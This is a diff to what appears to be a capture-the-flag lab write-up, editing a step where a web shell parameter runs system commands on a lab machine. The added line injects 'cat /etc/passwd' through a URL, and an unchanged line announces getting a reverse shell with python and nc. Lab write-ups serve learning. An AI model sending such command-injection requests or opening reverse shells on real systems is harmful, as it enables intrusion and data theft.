@@ -64,9 +64,11 @@
 
 ![11](images/login.jpg?raw=true "login")
 
-**Now, let's go and try to get some system commands inside the url:**
+**Now, let's try some system commands inside the url:**
 
-``http://10.10.252.248:22/nnxhweOV/index.php?cmd=whoami``
+``http://10.10.252.248:22/nnxhweOV/index.php?cmd=cat /etc/passwd``
+
+![cmd](images/cmdworks.jpg?raw=true "cmd")
 
 + **It's all working, so go grab a reverse shell. I'm gonna use python and start listen with nc**
 
